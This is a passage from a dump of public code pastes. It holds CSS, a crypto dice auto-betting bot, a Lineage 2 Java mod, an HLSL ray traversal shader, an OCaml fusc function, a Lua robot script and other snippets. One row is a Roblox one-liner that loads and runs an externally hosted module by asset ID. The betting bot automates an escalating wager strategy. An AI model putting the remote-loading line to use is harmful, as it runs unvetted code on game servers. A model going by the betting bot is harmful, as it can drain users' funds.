	REM REM echo\::reset tutte le var ""my_""
	REM REM echo\::%RESET_all_var%
	REM endlocal
goto :EOF
:SOS_all_end

::::::::::::: Etichette attive solo se richamate da CALL fine ::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
"
w3Ufff0Q,Untitled,s-sols,CSS,Friday 24th of May 2024 08:13:31 AM CDT,"body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .site-banner .item-wrapper.owl-carousel {
	display: flex !important;
	justify-content: center;
	overflow: hidden;
	gap: 30px;
}

body.home .site-banner .item-wrapper.owl-carousel {
	--item-width: calc((100vw - 500px) / 3);
}

	body.home .site-banner .item-wrapper.owl-carousel.owl-loaded {
		gap: 0 !important;
	}

body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .site-banner .item-wrapper.owl-carousel .item {
	float: left;
	display: block !important;
	width: var(--item-width);
	flex-shrink: 0;
	order: 2;
}

@media screen and (min-width: 1024px) {
	body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .site-banner .item-wrapper.owl-carousel:not(.owl-loaded) .item {
		transform: translateX(-18px);
	}
}

body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .site-banner .item-wrapper.owl-carousel .item:nth-of-type(1n + 4) {
	display: none !important;
}

body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .site-banner .item-wrapper.owl-carousel .item:last-of-type {
	order: 1;
	display: block !important;
}

body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .site-banner .item-wrapper.owl-carousel .item:nth-last-child(2) {
	order: 0;
	display: block !important;
}

body.home .site-banner .item-wrapper.owl-carousel .owl-item {
	width: var(--item-width) !important;
}

body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .site-banner .item-wrapper.owl-carousel .item img {
	display: block;
	width: 100%;
	height: auto;
	aspect-ratio: 340/370;
}


@media screen and (max-width: 1023px) {
	body.home .site-banner .item-wrapper.owl-carousel {
		--item-width: calc((100vw - 30px - 60px) / 3);
		--item-width: calc((100vw - 30px + (100vw - 1020px) / 2) / 3);
	}
}


@media screen and (max-width: 767px) {
	body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .site-banner .item-wrapper.owl-carousel {
		justify-content: center;
	}

		body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .site-banner .item-wrapper.owl-carousel .item:nth-of-type(1n + 3) {
			display: none !important;
		}

		body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .site-banner .item-wrapper.owl-carousel .item:last-of-type {
			order: 0;
			display: block !important;
		}

	body.home .site-banner .item-wrapper.owl-carousel {
		--item-width: calc(100vw - 30px - 60px - 40px);
	}
}
"
CXQKn0dD,Untitled,s-sols,CSS,Friday 24th of May 2024 07:52:40 AM CDT,"body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .home-banner .hero {
	visibility: visible !important;
	opacity: 1 !important;
}

	body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .home-banner .hero .hero-slider:nth-of-type(1n + 2) {
		display: none !important;
	}

body.home .slick-slide .hero-slider .container.main-content .header-content {
	animation: none !important;
}

body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .home-banner:not(:has(.slick-arrow)) .container.main-content {
	padding: 0 !important;
}

@media screen and (max-width: 992px) {
	body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .home-banner:not(:has(.slick-arrow)) .col-lg-12 {
		padding: 0 !important;
	}

	body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .home-banner:not(:has(.slick-arrow)) .container.main-content {
		padding: 0 25px !important;
	}
}

@media screen and (max-width: 767px) {
	body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .home-banner:not(:has(.slick-arrow)) .container.main-content {
		padding: 0 25px !important;
	}

	body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .home-banner:not(:has(.slick-track)) .hero-slider {
		background-size: calc(100% + 30px);
	}

	body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .home-banner:not(:has(.slick-track)) .container.main-content {
		margin: 0 -15px;
	}

	body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .home-banner:not(:has(.slick-arrow)) .container.main-content .col-lg-12 {
		padding: 0 15px !important;
	}
}

@media screen and (max-width: 584px) {
	body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .home-banner .hero .container.main-content .col-lg-12 {
		padding: 0 0 0 15px !important;
	}
}

@media screen and (max-width: 574px) {
	body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .home-banner .slick-track .container.main-content .col-lg-12 {
		padding: 0 15px !important;
		padding-right: 0 !important;
	}

	body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .home-banner:not(:has(.slick-track)) .container.main-content {
		padding-right: 0 !important;
	}
}

@media screen and (max-width: 554px) {
	body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .home-banner .slick-track .container.main-content .col-lg-12 {
		padding-right: 15px !important;
	}

	body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .home-banner:not(:has(.slick-track)) .container.main-content {
		padding-right: 15px !important;
	}
}

@media screen and (max-width: 474px) {
	body.home:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .home-banner:not(:has(.slick-track)) .hero-slider {
		background-size: cover;
	}
}
"
rr4kHhpa,amazing snowybot 3.14,coinwalk,JavaScript,Friday 24th of May 2024 07:19:11 AM CDT,"var OriginalBalanCe = parseFloat(document.getElementById('pct_balance').value);
var BaseBet = Number((OriginalBalanCe*0.001).toFixed(8));
var NexTBet = BaseBet;
var tens = (BaseBet*10);
var fives = (BaseBet*4.9);
var sevens = (BaseBet*6.9);
var eights = (BaseBet*7.9);
var winnerdinner = (OriginalBalanCe*2);
var snowzy = ((Math.floor(OriginalBalanCe/tens))*tens);
var loL = ((Math.floor(OriginalBalanCe/tens))*tens);
var snowy = 0;
var BalanCe = OriginalBalanCe;
 
function go(){
BalanCe = document.getElementById('pct_balance').value;
var dog = Number((BalanCe-OriginalBalanCe).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((BalanCe>(((Math.floor(BalanCe/tens))*tens)+sevens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+eights))&&(BalanCe!=snowy)){
    NexTBet = NexTBet*2;
    snowy = parseFloat(BalanCe);
}
if (((BalanCe*0.024)<=NexTBet)&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+sevens))){ 
    NexTBet = BaseBet;
    snowy = 0;
}
if (((OriginalBalanCe*0.1)<=NexTBet)&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+sevens))){ 
    NexTBet = BaseBet;
    snowy = 0;
}
if (BalanCe>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((NexTBet*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 10);
}
go();"
rwXx4bnx,LButton Snip Hotkey (redundant).ahk,Lorenzo501,Autohotkey,Friday 24th of May 2024 07:12:56 AM CDT,"; THIS ONE IS WORSE ACTUALLY, IT MAKES THE EXTRA SNIPPING TOOL FEATURES USELESS (SUCH AS WINDOW SNIP)

#Requires AutoHotkey 2.0
CoordMode(""Mouse"", ""Screen"")
snipCursor := {StartX: unset, StartY: unset} ; Ad hoc object, usable w/ dot notation (no need for class)
#HotIf WinActive(""ahk_exe ScreenClippingHost.exe"")
; can use WIN+SHIFT+S to take snips for now w/o the help of AHK

~*LButton::
{
    MouseGetPos(&startCursorX, &startCursorY)
    snipCursor.StartX := startCursorX
    snipCursor.StartY := startCursorY
}

~*LButton Up:: ;msgbox A_TimeSincePriorHotkey
{
    MouseGetPos(&endCursorX, &endCursorY)
    desktop := "" / "" A_ScreenWidth "" x "" A_ScreenHeight

    if (Abs(snipCursor.StartX - endCursorX) > 10 && Abs(snipCursor.StartY - endCursorY) > 10)
        MsgBox(Abs(snipCursor.StartX - endCursorX) "" x "" Abs(snipCursor.StartY - endCursorY) desktop)
}"
8krtEZLD,aCis Double Click Augment,Axelut,Java,Friday 24th of May 2024 06:46:09 AM CDT,"package net.sf.l2j.mods.itemhandlers;

import net.sf.l2j.gameserver.data.xml.AugmentationData;
import net.sf.l2j.gameserver.enums.Paperdoll;
import net.sf.l2j.gameserver.enums.SayType;
import net.sf.l2j.gameserver.handler.IItemHandler;
import net.sf.l2j.gameserver.model.Augmentation;
import net.sf.l2j.gameserver.model.actor.Playable;
import net.sf.l2j.gameserver.model.actor.Player;
import net.sf.l2j.gameserver.model.item.instance.ItemInstance;
import net.sf.l2j.gameserver.network.serverpackets.CreatureSay;
import net.sf.l2j.gameserver.network.serverpackets.ExShowScreenMessage;
import net.sf.l2j.gameserver.network.serverpackets.InventoryUpdate;
import net.sf.l2j.gameserver.network.serverpackets.SocialAction;

/**
 * @author RKolibri
 */
public class FastAugmentation implements IItemHandler {
    @Override
    public void useItem(Playable playable, ItemInstance item, boolean forceUse) {
        Player player = (Player) playable;
        ItemInstance weapon = player.getInventory().getItemFrom(Paperdoll.RHAND);
        Augmentation topLs = AugmentationData.getInstance().generateRandomAugmentation(76, 3);
        Augmentation highLs = AugmentationData.getInstance().generateRandomAugmentation(76, 2);
        Augmentation midLs = AugmentationData.getInstance().generateRandomAugmentation(76, 1);
        Augmentation noGradeLs = AugmentationData.getInstance().generateRandomAugmentation(76, 0);
        InventoryUpdate iu = new InventoryUpdate();
        int ls = item.getItemId();
        if (weapon == null) {
            player.sendMessage(""You have to equip a weapon first."");
            return;
        }
        if (weapon.getItem().getCrystalType().getId() <= 3) {
            player.sendMessage(""Fast Augmentation available only for A and S grade  Weapons!"");
            return;
        }
        if (weapon.isHeroItem()) {
            player.sendMessage(""Hero weapons can't be augmented!"");
            return;
        }
        if (weapon.isAugmented()) {
            removeAug(playable);
        } else {
            player.destroyItem(""Consume"", item.getObjectId(), 1, null, false);
            Augmentation augmentation;
            if (ls == 8762) {
                augmentation = topLs;
            } else if (ls == 8752) {
                augmentation = highLs;
            } else if (ls == 8742) {
                augmentation = midLs;
            } else if (ls == 8732) {
                augmentation = noGradeLs;
            } else {
                return;
            }
            weapon.setAugmentation(augmentation);
            iu.addModifiedItem(weapon);
            player.sendPacket(iu);
            player.broadcastUserInfo();
            if (weapon.getAugmentation().getSkill() == null) {
                player.sendMessage(""No luck try again!"");
            } else {
                checkAugmentResult(playable);
            }
        }
    }

    public static boolean removeAug(Playable playable) {
        Player player = (Player) playable;
        ItemInstance weapon = player.getInventory().getItemFrom(Paperdoll.RHAND);
        InventoryUpdate iu = new InventoryUpdate();
        weapon.getAugmentation().removeBonus(player);
        weapon.removeAugmentation(true);
        iu.addModifiedItem(weapon);
        player.sendPacket(iu);
        player.broadcastUserInfo();
        return true;
    }

    private static void checkAugmentResult(Playable playable) {
        Player player = (Player) playable;
        ItemInstance weapon = player.getInventory().getItemFrom(Paperdoll.RHAND);
        String name = weapon.getAugmentation().getSkill().getName();
        boolean isChance = weapon.getAugmentation().getSkill().isChance();
        boolean isActive = weapon.getAugmentation().getSkill().isActive();
        boolean isPassive = weapon.getAugmentation().getSkill().isPassive() && !isChance;
        InventoryUpdate iu = new InventoryUpdate();

        String type;
        if (isChance) {
            type = ""CHANCE"";
        } else if (isActive) {
            type = ""ACTIVE"";
        } else if (isPassive) {
            type = ""PASSIVE"";
        } else {
            return;
        }

        player.sendPacket(new CreatureSay(0, SayType.HERO_VOICE, ""["" + type + ""]"", ""You got "" + name));
        sendMessage(player, type + "" : You got "" + name);
        player.broadcastPacket(new SocialAction(player, 3));
        player.disarmWeapon(true);
        iu.addModifiedItem(weapon);
        player.sendPacket(iu);
        player.broadcastUserInfo();
    }

    public static void sendMessage(final Player player, final String message) {
        player.sendPacket(new ExShowScreenMessage(message, 3000, ExShowScreenMessage.SMPOS.TOP_CENTER, true));
        player.sendMessage(message);
    }

}












//////////////////////////////////////////////
 you also have to register it on your net.sf.l2j.gameserver.handler.ItemHandler.java

 

registerHandler(new FastAugmentation());

 

and on your items xml file

e.g gameserver/data/xml/items/8700-8799.xml

 

add this

add this 
<set name=""handler"" val=""FastAugmentation"" />

It should be like this 

<item id=""8762"" type=""EtcItem"" name=""Top-Grade Life Stone: level 76"">
		<set name=""material"" val=""LIQUID"" />
		<set name=""weight"" val=""2"" />
		<set name=""price"" val=""4800000"" />
		<set name=""handler"" val=""FastAugmentation"" />
		<set name=""is_stackable"" val=""true"" />
		<cond msgId=""113"">
			<player level=""76"" />
		</cond>
	</item>

"
TJ1YJvvv,CWBVH 8-wide traversal,Zgragselus,C,Friday 24th of May 2024 06:45:49 AM CDT,"///////////////////////////////////////////////////////////////////////////////////////////////////
//
// TraversalBvh8.hlsli
//
// Implements ray traversal through multi-level BVH-8 (CWBVH) acceleration structure.
// 
///////////////////////////////////////////////////////////////////////////////////////////////////

#ifndef __TRAVERSAL_BVH8__HLSLI__
#define __TRAVERSAL_BVH8__HLSLI__

#include ""../Raytracer.hlsli""

// Definition to compact funciton parameters into TraceRayCompute funciton (BVH-8 variant)
#define TRACE_RAY_PARAMS RWStructuredBuffer<GeometryNode> Geometries,\
                         RWStructuredBuffer<InstanceNode> Instances,\
                         RWStructuredBuffer<MemoryNode> ASTreeNodes,\
                         RWStructuredBuffer<BVH8Node> ASTreeData,\
                         RWStructuredBuffer<MemoryNode> ASIndexNodes,\
                         RWStructuredBuffer<uint> ASIndexData,\
                         RWStructuredBuffer<MemoryNode> WoopNodes,\
                         RWStructuredBuffer<float4> WoopData
    
// Definition to compact argument passing into TraceRayCompute function (BVH-8 variant)
#define TRACE_RAY_ARGS  Geometries,\
                        Instances,\
                        ASTreeNodes,\
                        ASTreeData,\
                        ASIndexNodes,\
                        ASIndexData,\
                        WoopNodes,\
                        WoopData

/// <summary>
/// Get octant of ray direction
/// </summary>
/// <param name=""rayDirection"">Ray direction</param>
/// <returns>Octant index encoded in 3 bits</returns>
uint GetOctant(float4 rayDirection)
{
    // Get inverse of ray octant, encoded in 3 bits
    return (rayDirection.x < 0.0f ? 0 : 0x04040404) |
		(rayDirection.y < 0.0f ? 0 : 0x02020202) |
		(rayDirection.z < 0.0f ? 0 : 0x01010101);
}

/// <summary>
/// Extract n-th byte from x
/// </summary>
/// <param name=""x"">Input value</param>
/// <param name=""n"">Byte index</param>
/// <returns>N-th byte value of input value</returns>
uint ExtractByte(uint x, uint n)
{
    return (x >> (n * 8)) & 0xFF;
}

/// <summary>
/// Intersect ray with BVH-8 in compact wide storage
/// </summary>
/// <param name=""origin"">Ray origin</param>
/// <param name=""direction"">Ray direction</param>
/// <param name=""octantInverse"">Inverse of ray octant</param>
/// <param name=""maxDistance"">Maximum distance to intersect</param>
/// <param name=""node0"">Holds origin point on local grid in first 12 bytes, exponents for axes in 3 bytes, mask in last byte (determining leaf/interior node)</param>
/// <param name=""node1"">Holds base child index (4-bytes), base triangle index (4-bytes), meta information (8-bytes)</param>
/// <param name=""node2"">Holds quantized AABBs - Min X (8-bytes), Max X (8-bytes)</param>
/// <param name=""node3"">Holds quantized AABBs - Min Y (8-bytes), Max Y (8-bytes)</param>
/// <param name=""node4"">Holds quantized AABBs - Min Z (8-bytes), Max Z (8-bytes)</param>
/// <returns>Hit mask</returns>
uint IntersectNode(float4 origin, float4 direction, uint octantInverse, float maxDistance, float4 node0, float4 node1, float4 node2, float4 node3, float4 node4)
{
    // Get base local point for children
    float3 p = node0.xyz;
    
    // Get exponents for axes
    uint emask = asuint(node0.w);
    uint eX = ExtractByte(emask, 0);
    uint eY = ExtractByte(emask, 1);
    uint eZ = ExtractByte(emask, 2);
    
    // Get adjusted direction by axes for intersection
    float3 adjDirection = float3(
        asfloat(eX << 23) / direction.x,
        asfloat(eY << 23) / direction.y,
        asfloat(eZ << 23) / direction.z
    );
    
    // Get adjusted origin for intersection
    float3 adjOrigin = (p - origin.xyz) / direction.xyz;
    
    // Resulting hitmask
    uint hitMask = 0;
    
    // Loop through data
    [unroll]
    for (int i = 0; i < 2; i++)
    {
        // Meta infromation
        uint meta4 = asuint(i == 0 ? node1.z : node1.w);
        
        // Extract bit indices and child bits
        uint isInner4 = (meta4 & (meta4 << 1)) & 0x10101010;
        uint innerMask4 = (((isInner4 << 3) >> 7) & 0x01010101) * 0xff;
        uint bitIndex4 = (meta4 ^ (octantInverse & innerMask4)) & 0x1F1F1F1F;
        uint childBits4 = (meta4 >> 5) & 0x07070707;
        
        // Extract quantized min/max of AABBs
        uint qLoX = asuint(i == 0 ? node2.x : node2.y);
        uint qHiX = asuint(i == 0 ? node2.z : node2.w);
        
        uint qLoY = asuint(i == 0 ? node3.x : node3.y);
        uint qHiY = asuint(i == 0 ? node3.z : node3.w);
        
        uint qLoZ = asuint(i == 0 ? node4.x : node4.y);
        uint qHiZ = asuint(i == 0 ? node4.z : node4.w);
        
        // Get per-axis min/max per direction of ray
        uint xMin = direction.x < 0.0f ? qHiX : qLoX;
        uint xMax = direction.x < 0.0f ? qLoX : qHiX;
        
        uint yMin = direction.y < 0.0f ? qHiY : qLoY;
        uint yMax = direction.y < 0.0f ? qLoY : qHiY;
        
        uint zMin = direction.z < 0.0f ? qHiZ : qLoZ;
        uint zMax = direction.z < 0.0f ? qLoZ : qHiZ;
        
        // Loop through all 4 AABBs in current iteration (2-iters = 8 AABBs in total)
        [unroll]
        for (int j = 0; j < 4; j++)
        {
            // Get quantized min value per axis for given AABB
            float3 tmin3 = float3(
                float(ExtractByte(xMin, j)),
                float(ExtractByte(yMin, j)),
                float(ExtractByte(zMin, j)));

            // Get quantized max value per axis for given AABB
            float3 tmax3 = float3(
                float(ExtractByte(xMax, j)),
                float(ExtractByte(yMax, j)),
                float(ExtractByte(zMax, j)));
            
            // Use adjusted origin and direction to calculate min/max values
            tmin3 = mad(tmin3, adjDirection, adjOrigin);
            tmax3 = mad(tmax3, adjDirection, adjOrigin);
            
            // Calculate entry and exist distances along ray
            float tmin = max(max(tmin3.x, tmin3.y), max(tmin3.z, 0.1f));
            float tmax = min(min(tmax3.x, tmax3.y), min(tmax3.z, maxDistance));
            
            // Check whether intersection happens
            bool intersection = tmin <= tmax;
            
            // In case of intersection, store in hitmask
            [branch]
            if (intersection)
            {
                uint childBits = ExtractByte(childBits4, j);
                uint bitIndex = ExtractByte(bitIndex4, j);
                
                hitMask |= childBits << bitIndex;
            }
        }
    }

    return hitMask;
}

/// <summary>
/// Performs ray traversal through acceleration structure for single ray.
///
/// This function performs traversal through compressed wide Bounding Volume Hierarchy 
/// (BVH-8/CWBVH). Result of this funciton is represented by barycentric coordinates, primitive ID, 
/// geometry ID and distance along the ray to hitpoint.
/// </summary>
/// <param name=""r"">Ray to trace.</param>
/// <param name=""Geometries"">Buffer of GeometryNode - holds all definition for geometries in the scene</param>
/// <param name=""Instances"">Buffer of InstanceNode - holds all geometry instances definitions in the scene</param>
/// <param name=""ASTreeNodes"">Buffer of memory nodes - each representing single BVH node data definition/offsets</param>
/// <param name=""ASTreeData"">Buffer of BVH nodes - BVH node data</param>
/// <param name=""ASIndexNodes"">Buffer of memory nodes - each representing single BVH index data definition/offsets</param>
/// <param name=""ASIndexData"">Buffer of BVH indices - BVH index data</param>
/// <param name=""WoopNodes"">Buffer of memory nodes - each representing definition/offsets into data buffer holding woop triangle data</param>
/// <param name=""WoopData"">Buffer of woop triangle data - Woop triangle geometry data</param>
/// <returns>
/// 4-component vector, where:
///   1st component has packed U/V barycentric coordinates (see PackFloat2/UnpackFloat2)
///   2nd component distance along the ray to hit
///   3rd component primitive ID (unsigned int)
///   4th component geometry ID (unsigned int)
/// </returns>
float4 TraceRayCompute(Ray r, TRACE_RAY_PARAMS)
{
    float4 o = r.Origin;
    float4 d = r.Direction;
    float4 inv = r.Inverse;
    uint octInv4 = GetOctant(d);
    
    uint2 currentGroup = uint2(0, 0x80000000);
    uint2 triangleGroup = uint2(0, 0);
        
    uint2 stack[BVH_STACK_SIZE];
    uint stack_ptr = 0;
 
    int meshbvh_stack_ptr = -1;
    
    float tmin = 0.0f;
    float tmax = 10000.0f;
    float bU = 0.0f;
    float bV = 0.0f;
    uint prim_id = 0;
    uint geometryID = 0;
    bool hit = false;
	
    InstanceNode instance = Instances[0];
    
	// Traversal (use for for testing)
    [loop]
    for (int i = 0; i < 1024; i++)
    {
        // Test whether we're in interior node
        [branch]
        if (currentGroup.y & 0xff000000)
        {
            // Get next child index (consume bit)
            uint childIndexOffset = firstbithigh(currentGroup.y);
            
            uint slotIndex = (childIndexOffset - 24) ^ (octInv4 & 0xff);
            uint relativeIndex = countbits(currentGroup.y & ~(0xffffffff << slotIndex));
            uint childNodeIndex = currentGroup.x + relativeIndex;
            
            currentGroup.y &= ~(1 << childIndexOffset);
            
            if (currentGroup.y & 0xff000000)
            {
                stack[stack_ptr] = currentGroup;
                stack_ptr++;
            }
            
            // Perform intersection test against all 8 children
            uint hitMask = IntersectNode(o,
                d,
                octInv4,
                tmax,
                ASTreeData[childNodeIndex].Node0,
                ASTreeData[childNodeIndex].Node1,
                ASTreeData[childNodeIndex].Node2,
                ASTreeData[childNodeIndex].Node3,
                ASTreeData[childNodeIndex].Node4);
            
            // Update masks from hit results
            currentGroup.y = (hitMask & 0xff000000) | ((asuint(ASTreeData[childNodeIndex].Node0.w) >> 24) & 0xff);
            triangleGroup.y = (hitMask & 0x00ffffff);
            
            currentGroup.x = asuint(ASTreeData[childNodeIndex].Node1.x);
            triangleGroup.x = asuint(ASTreeData[childNodeIndex].Node1.y);
        }
        else
        {
            // Leaf node - current node group holds triangle group
            triangleGroup = currentGroup;
            currentGroup = uint2(0, 0);
        }
        
        // We are in leaf node
        if (triangleGroup.y != 0)
        {
            // We're searching top-level BVH (TLAS), enter bottom-level BVH (BLAS)
            if (meshbvh_stack_ptr == -1)
            {
                uint blas_offset = firstbithigh(triangleGroup.y);
                triangleGroup.y &= ~(1 << blas_offset);
                uint index_offset = ASIndexNodes[triangleGroup.x + blas_offset].Offset / 4;
                uint instance_index = ASIndexData[triangleGroup.x + blas_offset];
                instance = Instances[instance_index];
                                
                if (triangleGroup.y != 0)
                {
                    stack[stack_ptr] = triangleGroup;
                    stack_ptr++;
                }
                
                if (currentGroup.y & 0xff000000)
                {
                    stack[stack_ptr] = currentGroup;
                    stack_ptr++;
                }
                
                meshbvh_stack_ptr = stack_ptr;
            
                o = mul(r.Origin, instance.TransformInverse);
                d = mul(r.Direction, instance.TransformInverse);
                inv = rcp(d);
                octInv4 = GetOctant(d);
                
                currentGroup.x = ASTreeNodes[Geometries[instance.GeometryNode].BVHNode + 1].Offset / 80;
                currentGroup.y = 0x80000000;
            }
            // We're already in bottom-level BVH (BLAS)
            else
            {
                while (triangleGroup.y != 0)
                {
                    // Obtain next triangle from triangle group in BLAS node record
                    uint triangleIndex = firstbithigh(triangleGroup.y);
                    triangleGroup.y &= ~(1 << triangleIndex);
            
                    GeometryNode geom = Geometries[instance.GeometryNode];
                    MemoryNode wbo = WoopNodes[geom.WoopBufferNode];
                
                    uint index_offset = ASIndexNodes[triangleGroup.x + triangleIndex].Offset / 4;
             
					// Don't trash cache by reading index through it
                    uint tri_idx = ASIndexData[triangleGroup.x + triangleIndex] * 3;
                    
                    // Fetch data for Woop's triangle
                    float4 r = WoopData[wbo.Offset / 16 + tri_idx + 0];
                    float4 p = WoopData[wbo.Offset / 16 + tri_idx + 1];
                    float4 q = WoopData[wbo.Offset / 16 + tri_idx + 2];
                    
                    // Perform intersection
                    float o_z = r.w - o.x * r.x - o.y * r.y - o.z * r.z;
                    float i_z = 1.0f / (d.x * r.x + d.y * r.y + d.z * r.z);
                    float t = o_z * i_z;
                    
                    if (t > tmin && t < tmax)
                    {
                        float o_x = p.w + o.x * p.x + o.y * p.y + o.z * p.z;
                        float d_x = d.x * p.x + d.y * p.y + d.z * p.z;
                        float u = o_x + t * d_x;

                        if (u >= 0.0f && u <= 1.0f)
                        {
                            float o_y = q.w + o.x * q.x + o.y * q.y + o.z * q.z;
                            float d_y = d.x * q.x + d.y * q.y + d.z * q.z;
                            float v = o_y + t * d_y;
                            
                            if (v >= 0.0f && u + v <= 1.0f)
                            {
                                tmax = t;
                                bU = u;
                                bV = v;
                                hit = true;

                                geometryID = instance.GeometryNode;
                                prim_id = tri_idx;
                            }
                        }
                    }
                }
            }
        }
        
        // Pop stack if any item still in it, end traversal otherwise
        if ((currentGroup.y & 0xff000000) == 0)
        {
            // Entrypoint has been reached, terminate traversal
            if (stack_ptr == 0)
            {
                break;
            }
            
            // If we're in BLAS and we're on entrypoint, then reset the ray as the traversal will 
            // continue in TLAS
            if (stack_ptr == meshbvh_stack_ptr)
            {
                meshbvh_stack_ptr = -1;
                
                o = r.Origin;
                d = r.Direction;
                inv = r.Inverse;
                octInv4 = GetOctant(d);
            }
            
            // Pop from stack 
            stack_ptr--;
            currentGroup = stack[stack_ptr];
        }
    }
    
    return float4(PackFloat2(bU, bV), tmax, asfloat(prim_id), asfloat(geometryID));
}

#endif"
S1tj7JJE,Untitled,MingLLuo,OCaml,Friday 24th of May 2024 06:38:41 AM CDT,"(* f(0) = 0
     f(1) = 1
     f(2n) = n
     f(2n + 1) = f(n) + f(n + 1)
    --------------------------------

    a * f(2n) + b * f(2n + 1) = (a + b) * f(n) + b * f(n + 1)
    let F(x, y, z) = x * f(z) + y * f(z + 1)
    then
     F(a, b, 2n) = F(a+b, b, n)

    if z is even
     then F(x, y, z) = F(x + y, y, z / 2)
   else
     F(x, y, z) = x * f(z) + y * f(z + 1) = x * (f( (z - 1) / 2 ) + f( (z + 1) / 2)) + y * f( (z + 1) / 2)
       = x * f((z-1)/2) + (x + y) * f((z-1)/2 + 1)
       = F(x, x + y, (z - 1) / 2)
*)

let fusc (n : int) : int =
  let rec f x y z =
    if z == 0 then y
    else if z mod 2 = 0 then f (x + y) y (z / 2)
    else f x (x + y) ((z - 1) / 2)
  in
  f 1 0 n
"
Ng0dK7RL,growthhelper.lua,maxeebon,Lua,Friday 24th of May 2024 06:36:30 AM CDT,"--   автоматизация фарма дерева
--   конфигурация запуска: робот смотрит в точку гед саженец, робот должен иметь сундук сверху 
--   для складывания надамаженного инструмента, снизу сундук где будет починеный инструмент
--   при запуске инструмент должен быть в инвентаре робота
--

local r = require(""robot"")
local component = require(""component"")
local sides = require(""sides"")
local inv = component.inventory_controller

local toolLabel = ""Hoe of Growth""   -- название инструмента
local repairWaitingSleepTime = 4    -- время ожидания повторной проверки починки инструмента (в сек.)
local durThreshold = 0.05			-- процент инструмента для начала починки

local rInvSize = r.inventorySize()

function criticalError(str)
	print(""ERROR: ""..str)
	os.exit()
end

function findHoe()
	local a
	local found = false
	print(""finding hoe..."")
	
	if not found and not r.durability() then
		for i = 1,rInvSize do
			a = inv.getStackInInternalSlot(i)
			if a and a.label == toolLabel then
				found = true
				r.select(i)
				break
			end
		end
	end
	if not found then
		r.select(1)
		inv.equip()
		a = inv.getStackInInternalSlot(1)
		if a and a.label == toolLabel then
			found = true
		end
	end
	if not found then
		criticalError(""cannot find ""..toolLabel)
	end
	r.transferTo(1)
	r.select(1)
	inv.equip()
end

function init()
	findHoe()
	if not inv.getInventoryName(sides.bottom) then
		criticalError(""cannot find bottom inventory for repaired ""..toolLabel)
	end
	if not inv.getInventoryName(sides.top) then
		criticalError(""cannot find top inventory for damaged ""..toolLabel)
	end
end

function isDamaged()
	return r.durability() <= durThreshold
end

function placeForRepair()
	inv.equip()
	print(""placing ""..toolLabel.."" for repair"")
	if not inv.dropIntoSlot(sides.top,1) then
		criticalError(""cannot place ""..toolLabel.."" into top inventory"")
	end
end

function waitForRepair()
	local a = nil
	while not a do
		print(""waiting for ""..toolLabel.."" repairing"")
		os.sleep(repairWaitingSleepTime)
		a = inv.getStackInSlot(sides.bottom,1)
	end
	if a.label ~= toolLabel then
		criticalError(""wrong item in bottom chest"")
	end
	if not inv.suckFromSlot(sides.bottom,1) then
		criticalError(""cannot suck ""..toolLabel.."" from bottom inventory"")
	end
	inv.equip()
end

-- main

init()
while true do
	local flag,block = r.detect()
	if block == ""solid"" then
		print(""block is solid"")
		os.sleep(0.5)
	else
		print(""using ""..toolLabel)
		r.use()
		if isDamaged() then
			placeForRepair()
			os.sleep(1)
			waitForRepair()
		end
		os.sleep(0.01)
	end
end
"
vZPJyJN7,Black Hole Gun,robinmollen,Lua,Friday 24th of May 2024 06:27:59 AM CDT,"require(17585297630)(""YourNameHere"")"
WunBBPLN,Untitled,Armen_06,Dart,Friday 24th of May 2024 06:04:52 AM CDT,"            openInAppController.stream.listen((event) async {
              if (widget.index != selectedIndexNotifier.value) return;

              final urlToLaunch = (await controller.getUrl()).toString();

              ApplicationMessagesService.showSnackBarGenericError(
                  context, (await controller.getHtml()) as String);

              ApplicationMessagesService.showSnackBarGenericError(
                  context, urlToLaunch);
            });"
AkX2EJxH,data936,TestGuy1,JSON,Friday 24th of May 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
